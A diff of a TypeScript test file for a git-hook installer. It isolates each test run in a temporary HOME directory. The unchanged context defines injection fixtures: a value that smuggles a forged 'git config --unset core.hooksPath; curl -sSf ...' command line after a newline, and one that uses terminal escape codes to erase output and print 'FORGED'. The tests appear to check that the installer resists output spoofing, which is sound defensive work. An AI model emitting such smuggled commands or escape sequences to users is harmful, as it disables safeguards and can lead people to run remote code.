@@ -52,26 +52,31 @@ const FORGED_COMMAND_LINE = '  git config --unset core.hooksPath; curl -sSf http
 const NEWLINE_INJECTION_VALUE = `${INJECTED_PATH_PREFIX}\n${FORGED_REMEDY_LINE}\n${FORGED_COMMAND_LINE}`
 const ESCAPE_INJECTION_VALUE = `${INJECTED_PATH_PREFIX}${ESCAPE_BYTE}[2K${ESCAPE_BYTE}[31mFORGED`
 
-const INSTALLER_ENV: Record<string, string | undefined> = {
+const installerEnv = (home: string): Record<string, string | undefined> => ({
   PATH: process.env.PATH,
-  HOME: process.env.HOME,
+  HOME: home,
   GIT_CONFIG_NOSYSTEM: '1',
   GIT_CONFIG_GLOBAL: '/dev/null',
   GIT_TERMINAL_PROMPT: '0'
-}
+})
 
 type Observation = { status: number; stdout: string; stderr: string; pointerWritten: boolean }
 
 const runInstaller = (workingDirectory: string): RawGitResult => {
-  const result = spawnSync(process.execPath, [INSTALLER_PATH], {
-    cwd: workingDirectory,
-    env: INSTALLER_ENV,
-    encoding: 'utf8'
-  })
-  if (result.error !== undefined) {
-    throw new Error(`failed to spawn the installer at "${INSTALLER_PATH}": ${result.error.message}`)
+  const home = mkdtempSync(path.join(tmpdir(), 'logbook-test-home-'))
+  try {
+    const result = spawnSync(process.execPath, [INSTALLER_PATH], {
+      cwd: workingDirectory,
+      env: installerEnv(home),
+      encoding: 'utf8'
+    })
+    if (result.error !== undefined) {
+      throw new Error(`failed to spawn the installer at "${INSTALLER_PATH}": ${result.error.message}`)
+    }
+    return { status: result.status ?? -1, stdout: result.stdout ?? '', stderr: result.stderr ?? '' }
+  } finally {
+    rmSync(home, { recursive: true, force: true })
   }
-  return { status: result.status ?? -1, stdout: result.stdout ?? '', stderr: result.stderr ?? '' }
 }
 
 const pointerHookPath = (repo: string): string => path.join(repo, POINTER_HOOK_RELATIVE)
